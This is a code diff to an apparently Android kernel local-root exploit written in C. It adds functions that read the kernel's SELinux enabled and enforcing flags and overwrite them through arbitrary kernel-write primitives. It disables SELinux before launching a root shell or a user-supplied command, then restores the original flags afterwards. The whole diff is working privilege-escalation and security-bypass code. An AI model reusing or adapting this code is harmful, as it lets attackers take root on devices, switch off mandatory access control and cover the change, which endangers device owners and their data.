@@ -292,6 +292,28 @@ static int write_at_address(void* target, unsigned long targetval)
 	return 0;
 }
 
+static int selinux_enabled;
+static int selinux_enforcing;
+
+static void get_selinux_state(struct offsets* o)
+{
+	selinux_enabled = -1;
+	selinux_enforcing = -1;
+
+	if(o->selinux_enabled)
+		read_at_address_pipe(o->selinux_enabled, &selinux_enabled, sizeof(selinux_enabled));
+	if(o->selinux_enforcing)
+		read_at_address_pipe(o->selinux_enforcing, &selinux_enforcing, sizeof(selinux_enforcing));
+}
+
+static void set_selinux_state(struct offsets* o, int enabled, int enforcing)
+{
+	if(o->selinux_enabled)
+		write_at_address_pipe(o->selinux_enabled, &enabled, sizeof(enabled));
+	if(o->selinux_enforcing)
+		write_at_address_pipe(o->selinux_enforcing, &enforcing, sizeof(enforcing));
+}
+
 #if !(__LP64__)
 int getroot(struct offsets* o)
 {
@@ -312,15 +334,6 @@ int getroot(struct offsets* o)
 	ti = (struct thread_info*)fsync(dev);
 	if(modify_task_cred_uc(ti))
 		goto end;
-
-
-	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
-	}
 
 	ret = 0;
 end:
@@ -358,15 +371,6 @@ int getroot(struct offsets* o)
 
 	if((ret = modify_task_cred_uc(ti)))
 		goto end;
-
-	//Z5 has domain auto trans from init to init_shell (restricted) so disable selinux completely
-	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
-	}
 
 	ret = 0;
 end:
@@ -408,6 +412,12 @@ int main(int argc, char* argv[])
 	if(getuid() == 0)
 	{
 		printf("got root lmao\n");
+
+		get_selinux_state(o);
+
+		printf("    [+] Disable SELinux\n");
+		set_selinux_state(o, 0, 0);
+
 		if(argc <= 1)
 			system("USER=root /system/bin/sh");
 		else
@@ -422,6 +432,9 @@ int main(int argc, char* argv[])
 			}
 			system(cmd);
 		}
+
+		printf("    [+] Restore SELinux\n");
+		set_selinux_state(o, selinux_enabled, selinux_enforcing);
 	}
 	
 	return ret;
